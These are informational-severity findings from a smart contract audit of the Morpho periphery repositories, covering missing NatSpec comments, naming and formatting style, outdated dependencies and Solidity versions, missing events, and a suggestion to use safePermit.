### NatSpec: Error declarations should have NatSpec descriptions

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The Solidity [NatSpec (Natural Specification)](https://docs.soliditylang.org/en/v0.8.11/natspec-format.html) guidelines recommend that all error declarations be annotated with descriptive comments. This practice improves code readability and helps developers understand the conditions under which errors are thrown.

**File: `IAaveV3Optimizer.sol` in morpho-blue-bundlers**
   - The error declaration `InvalidSignatory` lacks a NatSpec description.
   - [View Error Declaration - Line 24](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L24)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3Optimizer.sol

24:     error InvalidSignatory(); 
```

- Recommendation
To adhere to best practices and enhance code understandability, it is recommended to add a NatSpec comment above the `InvalidSignatory` error declaration. The comment should explain the circumstances under which this error is thrown. For instance:

```solidity
/// @notice Thrown when the signatory is not valid or authorized for the intended operation.
error InvalidSignatory();
```

By implementing this change, the codebase aligns better with Solidity's documentation standards, making it more maintainable and easier for other developers to comprehend.



### NatSpec: Modifier missing NatSpec @param tag

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The Solidity [NatSpec (Natural Specification)](https://docs.soliditylang.org/en/v0.8.11/natspec-format.html) guidelines emphasize the importance of thoroughly documenting public interfaces in the ABI, including modifiers. Proper documentation is crucial for readability and auditability, especially in complex DeFi projects.

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @audit Missing @param for all modifier parameters
176:     modifier afterTimelock(uint256 validAt) { 
```
[176](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L176-L176)

**File: `MetaMorpho.sol` in metamorpho**
   - The `afterTimelock` modifier lacks NatSpec documentation for its parameter.
   - [View Modifier Declaration - Line 176](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L176)

- Recommendation
To align with best practices and enhance the clarity of the codebase, it is recommended to add NatSpec comments for the `afterTimelock` modifier, specifically using the `@param` tag to describe its parameter. For example:

```solidity
/// @notice Ensures the function is called after a specific timelock period.
/// @param validAt The timestamp after which the modifier permits function execution.
modifier afterTimelock(uint256 validAt) { 
    ...
}
```

By implementing this change, the codebase will be more aligned with Solidity's documentation standards, thus improving maintainability and ease of understanding for other developers and auditors.



### Non-external/public function names should begin with an underscore

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The Solidity Style Guide recommends that non-`external`/`public` functions should begin with an underscore. This naming convention enhances code readability and clarity about the function's visibility. However, several instances in the codebase do not adhere to this guideline.

1.**Contract: `MathLib.sol` in morpho-blue-irm**
   - Functions `wMulDown` and `wDivDown` should start with an underscore.
   - [View Function - Lines 13-19](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13-L19)

2.**Contract: `UtilsLib.sol` in morpho-blue-irm**
   - Function `bound` should start with an underscore.
   - [View Function - Lines 11-18](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11-L18)

3.**Contract: `ChainlinkDataFeedLib.sol` in morpho-blue-oracles**
   - Functions `getPrice` and `getDecimals` should start with an underscore.
   - [View Function - Lines 20-35](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20-L35)

4.**Contract: `VaultLib.sol` in morpho-blue-oracles**
   - Function `getAssets` should start with an underscore.
   - [View Function - Lines 13-17](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13-L17)

- Recommendation
To align with the Solidity Style Guide, it is recommended to rename these functions by prefixing them with an underscore (`_`). For example, `wMulDown` should be renamed to `_wMulDown`. This change will improve code readability and adherence to best practices in Solidity development.



### Not using the latest versions of project dependencies

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
Currenntly some repositories from `Metamorpho and Periphery` are using older versions of critical dependencies. Keeping dependencies up to date is crucial for ensuring the security, performance, and compatibility of your codebase.

|Dependency|Current Version|Latest Version|
|:-:|:-:|:-:|
|`forge-std`|1.7.1|1.7.3|
|`forge-std`|1.6.0|1.7.3|
|`openzeppelin-contracts`|4.9.3|5.0.0|
|`forge-std`|1.5.4|1.7.3|
|`openzeppelin-contracts`|4.9.2|5.0.0|

The file `AdaptiveCurveIrm.sol` in `morpho-blue-irm/src` is one such instance where these outdated dependencies are likely utilized.

- Recommendation
Upgrade `forge-std` to version 1.7.3 and `openzeppelin-contracts` to version 5.0.0. Ensure that the upgraded versions are compatible with your codebase.

Newer versions of dependencies often include patches for known vulnerabilities, thus reducing security risks.



### Outdated Solidity version	_(duplicate of [Different solidity versions across the code base])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description

Upgrade to the latest solidity version.

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L2)

```solidity
📁 File: metamorpho/src/MetaMorphoFactory.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L2)

```solidity
📁 File: metamorpho/src/interfaces/IMetaMorpho.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L2)

```solidity
📁 File: metamorpho/src/interfaces/IMorphoMarketParams.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L2)

```solidity
📁 File: metamorpho/src/libraries/ConstantsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L2)

```solidity
📁 File: metamorpho/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L2)

```solidity
📁 File: metamorpho/src/libraries/EventsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/BaseBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/ERC4626Bundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/MorphoBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/Permit2Bundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/PermitBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/StEthBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/TransferBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/UrdBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/WNativeBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/EthereumStEthBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IMorphoBundler.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IStEth.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IWNative.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/libraries/ConstantsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ConstantsLib.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ErrorsLib.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/AaveV3OptimizerMigrationBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3OptimizerMigrationBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3Optimizer.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L2)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

2: pragma solidity >=0.5.0; 
```
[2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L2)

```solidity
📁 File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

2: pragma solidity 0.8.19; 
```
[2](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L2)

```solidity
📁 File: morpho-blue-irm/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/ErrorsLib.sol#L2)

```solidity
📁 File: morpho-blue-irm/src/libraries/MathLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L2)

```solidity
📁 File: morpho-blue-irm/src/libraries/UtilsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L2)

```solidity
📁 File: morpho-blue-oracles/src/ChainlinkOracle.sol

2: pragma solidity 0.8.21; 
```
[2](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L2)

```solidity
📁 File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L2)

```solidity
📁 File: morpho-blue-oracles/src/interfaces/IERC4626.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L2)

```solidity
📁 File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L2)

```solidity
📁 File: morpho-blue-oracles/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L2)

```solidity
📁 File: morpho-blue-oracles/src/libraries/VaultLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L2)

```solidity
📁 File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

2: pragma solidity 0.8.19; 
```
[2](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L2)

```solidity
📁 File: universal-rewards-distributor/src/UrdFactory.sol

2: pragma solidity 0.8.19; 
```
[2](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L2)

```solidity
📁 File: universal-rewards-distributor/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/ErrorsLib.sol#L2)

```solidity
📁 File: universal-rewards-distributor/src/libraries/EventsLib.sol

2: pragma solidity ^0.8.0; 
```
[2](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L2)


- Recommended Mitigation Steps
Consider updating to a more recent solidity version.



### Events in public function missing sender information	_(duplicate of [Events are missing sender information])_

**Severity:** Informational

**Context:** [AdaptiveCurveIrm.sol#L110-L110](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L110-L110), [UniversalRewardsDistributor.sol#L135-L135](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L135-L135)

**Description:**

In the Morpho periphery protocols, events emitted in public or external functions currently lack the inclusion of sender information. Incorporating sender information in these events is essential for improving traceability and transparency within the smart contract.

**Recommendation:**

To address this issue and enhance the clarity of contract events, it is recommended to modify the relevant events by including the sender's information. This adjustment ensures that the emitted events provide comprehensive details, aiding in the monitoring and analysis of contract interactions. Additionally, documenting these changes will help users and developers understand the significance of sender information in the context of specific events.



### State variables should include comments

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
1.**Implicit Default Visibility for Variables**: In Solidity, state variables without an explicit visibility modifier are implicitly `internal`. It's considered best practice to always specify the visibility explicitly for clarity and to avoid confusion.

2.**Lack of Comments on Critical State Variables**: Comments are crucial for understanding the purpose and function of critical state variables, especially during code reviews or future modifications.

- Instances
1.**Contract: `ErrorsLib.sol` in morpho-blue-oracles**
   - Variables `NEGATIVE_ANSWER`, `VAULT_CONVERSION_SAMPLE_IS_ZERO`, and `VAULT_CONVERSION_SAMPLE_IS_NOT_ONE` have implicit `internal` visibility. 
   - [View Variables - Lines 10, 13, 16](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L10-L16)

2.**Contract: `UrdFactory.sol` in universal-rewards-distributor**
   - Variable `isUrd` lacks explanatory comments.
   - [View Variable - Line 15](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L15)

- Recommendation
To improve code clarity, explicitly define the visibility of the variables.



### Top-level declarations should be separated by at least two lines

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
In Solidity, it's a common practice to separate top-level declarations by at least two lines to enhance readability and maintain a consistent code structure. This approach aligns with various coding standards and helps in maintaining a clean and understandable codebase, particularly in large projects.

There are several contracts where top-level declarations are not separated by two lines were identified. Below are a few examples:

1. **Contract: `MetaMorpho.sol`**
   - Lines [43-59](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L43-L59) and [925](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L925)

2. **Contract: `MetaMorphoFactory.sol`**
   - Lines [13-17](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L13-L17) and [58](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L58)

3. **Contract: `interfaces/IMetaMorpho.sol`**
   - Lines [18-19](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L18-L19), [22-27](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L22-L27), [32-75](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L32-L75), [80-84](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L80-L84), [91-95](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L91-L95)

4. **Contract: `interfaces/IMorphoMarketParams.sol`**
   - Lines [6-7](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L6-L7)

5. **Contract: `libraries/ConstantsLib.sol`**
   - Lines [8-10](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L8-L10)

6. **Contract: `libraries/ErrorsLib.sol`**
   - Lines [10-12](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L10-L12)

- Recommendation
To improve readability and maintain a consistent code structure, it is recommended to insert an extra line between each top-level declaration in the identified files. This change will bring the codebase in line with widely accepted Solidity coding standards and make it easier for developers to navigate and understand the code structure.



### Use of override is unnecessary

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The Solidity language, starting from version 0.8.8, no longer requires the use of the `override` keyword when a function only overrides an interface function and the function does not exist in multiple base contracts. The unnecessary use of `override` in these cases can lead to redundancy and potential confusion.

In the `MetaMorpho.sol` contract, there are 14 instances where the `override` keyword is used, but it is not necessary as per the updated Solidity guidelines. These instances are as follows:

1. `maxDeposit` function on [line 531](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531)
2. `maxMint` function on [line 536](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536)
3. `maxWithdraw` function on [line 545](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545)
4. `maxRedeem` function on [line 552](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552)
5. `deposit` function on [line 559](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559)
6. `mint` function on [line 572](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572)
7. `withdraw` function on [line 585](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585)
8. `redeem` function on [line 599](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599)
9. `totalAssets` function on [line 613](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613)
10. `_decimalsOffset` function on [line 622](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L622)
11. `_convertToShares` function on [line 657](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L657)
12. `_convertToAssets` function on [line 665](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L665)
13. `_deposit` function on [line 695](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L695)
14. `_withdraw` function on [lines 711-714](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L711-L714)

- Recommendation
It is recommended to remove the `override` keyword in the aforementioned instances to comply with the latest Solidity standards and avoid redundancy. This will streamline the code and maintain its alignment with the current best practices in Solidity development.



### Bundler does not emit any events

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description:**

The Morpho Blue bundler facilitates the bundling of multiple calls into a single transaction; however, it deviates from other periphery libraries by not emitting any events. To enhance monitoring capabilities and provide transparency, it is recommended to introduce at least a single event at the start of the multicall.

**Recommendation:**

Enhance the Morpho Blue bundler library by incorporating events to improve monitoring and transparency during multicall transactions.



### Use `safePermit` in place of `permit`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description

OpenZeppelin's SafePermit is designed to facilitate secure and seamless token approvals via off-chain signed messages, mitigating the risks associated with on-chain transactions as it will check the nonces before and after transactions and ensure proper token allowance.

It is known that certain tokens such as DAI utilize a `permit()` function [here](https://etherscan.io/token/0x6b175474e89094c44da98b954eedeac495271d0f#code) that deviates from the reference implementation in `ERC20.sol`. The differences are outlined [here](https://eips.ethereum.org/EIPS/eip-2612#backwards-compatibility). The lack of verification could lead to unexpected behavior when interacting with non-conforming tokens.

```solidity
📁 File: morpho-blue-bundlers/src/Permit2Bundler.sol

33:         try Permit2Lib.PERMIT2.permit(initiator(), permitSingle, signature) {}
```

[33](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L33)

```solidity
📁 File: morpho-blue-bundlers/src/PermitBundler.sol

27:         try IERC20Permit(asset).permit(initiator(), address(this), amount, deadline, v, r, s) {}
```

[27](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L27)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

29:         try IDaiPermit(MainnetLib.DAI).permit(initiator(), address(this), nonce, expiry, allowed, v, r, s) {}
```

[29](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L29)

- Recommendations

Use `safePermit` from OZ implementation [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/e50c24f5839db17f46991478384bfda14acfb830/contracts/token/ERC20/utils/SafeERC20.sol#L95-L109) instead of a `permit()` function. (For more details you can check this [discussion](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3145))



### Named mappings should be used	_(duplicate of [Named mappings should be used])_

**Severity:** Informational

**Context:** [MetaMorphoFactory.sol#L22-L22](metamorpho/src/MetaMorphoFactory.sol#L22-L22), [MetaMorpho.sol#L67-L67](metamorpho/src/MetaMorpho.sol#L67-L67), [MetaMorpho.sol#L73-L73](metamorpho/src/MetaMorpho.sol#L73-L73), [MetaMorpho.sol#L82-L82](metamorpho/src/MetaMorpho.sol#L82-L82), [AdaptiveCurveIrm.sol#L57-L57](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L57-L57), [UniversalRewardsDistributor.sol#L36-L36](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L36-L36), [UrdFactory.sol#L15-L15](universal-rewards-distributor/src/UrdFactory.sol#L15-L15)

